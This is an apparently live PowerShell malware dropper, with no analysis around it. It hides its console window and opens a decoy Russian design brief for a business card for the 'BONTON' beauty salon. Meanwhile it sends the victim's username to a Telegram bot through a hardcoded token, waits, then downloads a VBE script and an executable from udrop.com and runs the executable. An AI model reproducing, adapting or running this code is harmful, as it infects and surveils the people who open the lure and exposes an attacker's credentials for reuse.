Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
$v0=[b0.a0]::GetConsoleWindow()
[b0.a0]::ShowWindow($v0,0)
$v1="Техническое_задание_BONTON.txt"
$v2=Join-Path $env:LOCALAPPDATA $v1
$v3=@"
ТЕХНИЧЕСКОЕ ЗАДАНИЕ
на разработку дизайн-макета визитной карточки
для мастерской красоты «BONTON»

Название компании: BONTON — мастерская красоты
Сфера деятельности: салон красоты премиум-класса (парикмахерские услуги, маникюр, педикюр, косметология)
Город: Волгоград
Адрес: ул. Покрышкина, 6
Веб-сайт: https://bon-ton.pro
Слоган компании: «Тёплая забота о вашей красоте»
Разработка дизайн-макета двусторонней визитной карточки в евроформате для мастерской красоты «BONTON» в стиле минимализма с использованием фирменной цветовой палитры компании.

Формат визитки: Евро (85 × 55 мм)
Ориентация: горизонтальная
Количество сторон: 2 (двусторонняя печать)
Вылеты под обрез: 3 мм с каждой стороны
Безопасная зона: 5 мм от края
Разрешение: 300 dpi
Цветовая модель: CMYK
Формат файлов для сдачи: .AI (Adobe Illustrator), .PDF (печатный, с вылетами), .PNG (превью, RGB)
Использовать фирменные цвета с сайта bon-ton.pro:
Тёмно-оливковый — основной фон, акценты
Бежевый/Кремовый — фон лицевой стороны
Белый — текст на тёмном фоне
Коричневый — дополнительные элементы
Золотистый — акцентные линии

Общий стиль:
Минимализм, премиальный и элегантный вид. Чистые линии, достаточно воздуха. Соответствие фирменному стилю сайта bon-ton.pro.
Лицевая сторона:
Логотип BONTON (ножницы + текст) по центру. Подпись «мастерская красоты» под логотипом. Фон бежевый/кремовый (#F5F0E6). Возможно использование тонких декоративных линий.
Оборотная сторона:
Фон тёмно-оливковый (#4A4A2A). Контактная информация белым цветом: телефоны, адрес (г. Волгоград, ул. Покрышкина, 6), сайт (bon-ton.pro). Слоган «Тёплая забота о вашей красоте». Небольшой логотип в углу (опционально).
Типографика:
Основной шрифт — современный, читаемый (рекомендуется Montserrat, Raleway или аналог). Шрифт для логотипа использовать оригинальный с сайта. Размер текста контактов не менее 7 pt. Межстрочный интервал 1.2–1.4.

В папке проекта предоставлены следующие материалы:
BONTON_logo.svg — логотип (светлый вариант)
BONTON_logo_dark.svg — логотип (тёмный вариант)
interior_1.webp, interior_2.webp, interior_3.webp — фото интерьера салона
about_salon.webp — фото салона (раздел «О нас»)
woman_hall.webp — изображение для женского зала
man_hall.webp — изображение для мужского зала

Ит_ог:
— Исходные файлы в формате .AI (Adobe Illustrator CC)
— PDF-файл для печати (CMYK, 300 dpi, с вылетами 3 мм)
— PNG-превью обеих сторон (RGB, 72 dpi)
— Шрифты, использованные в макете
"@
$v3|Out-File -FilePath $v2 -Encoding UTF8
Invoke-Item $v2
$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$v5="7063407604"
$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$v7="The user's shortcut was enabled for user: "+$v6
$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
Start-Sleep -Seconds 400
$v11="https://www.udrop.com/file/Od75/1446062403_house.delete"
$v12="1446062403_house.vbe"
$v13=[Environment]::GetFolderPath("LocalApplicationData")
$v14=Join-Path $v13 $v12
try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
$v17="1446062403_key.exe"
$v18=Join-Path $v13 $v17
try{
    $v19=New-Object System.Net.WebClient
    $v19.DownloadFile($v16,$v18)
    Start-Process -FilePath $v18 -WindowStyle Normal
}catch{}
exit